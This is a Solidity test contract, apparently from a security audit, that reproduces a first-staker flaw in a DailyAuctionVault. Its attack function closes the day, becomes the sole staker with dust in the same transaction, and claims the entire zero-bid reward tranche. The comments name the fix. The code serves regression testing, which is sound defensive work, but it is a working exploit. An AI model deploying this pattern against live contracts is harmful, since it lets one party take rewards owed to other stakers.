// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IQQVault {
    function closeDay(uint8 day) external;
    function stakingPool() external view returns (address);
}

interface IQQStaking {
    function stake(uint256 amount) external;
    function claim(address asset) external returns (uint256);
}

/// @dev AUDIT PROBE — reproduces the zero-bid-day first-staker finding.
///
/// `DailyAuctionVault.closeDay` is permissionless AND is the only thing that ever creates the coin's
/// RobinStaking pool. So the same transaction that births the pool can become its sole staker with dust,
/// before the pool's address is discoverable by anyone else, and collect the entire zero-bid tranche.
/// Measured: 2,105,536 gas for the pair, 100% capture.
///
/// Kept as a mock so the fix (seeding a dead stake before the first notifyReward, and emitting the pool
/// address in DayClosed) has something to regress against. Nothing deploys this outside tests.
contract QQAtomicFirstStaker {
    address public spSeen;

    function attack(address vault, address token, uint8 day, uint256 amt) external {
        IQQVault(vault).closeDay(day);
        address sp = IQQVault(vault).stakingPool();
        spSeen = sp;
        IERC20(token).approve(sp, type(uint256).max);
        IQQStaking(sp).stake(amt);
    }

    function claimAll(address token) external returns (uint256) {
        return IQQStaking(spSeen).claim(token);
    }
}
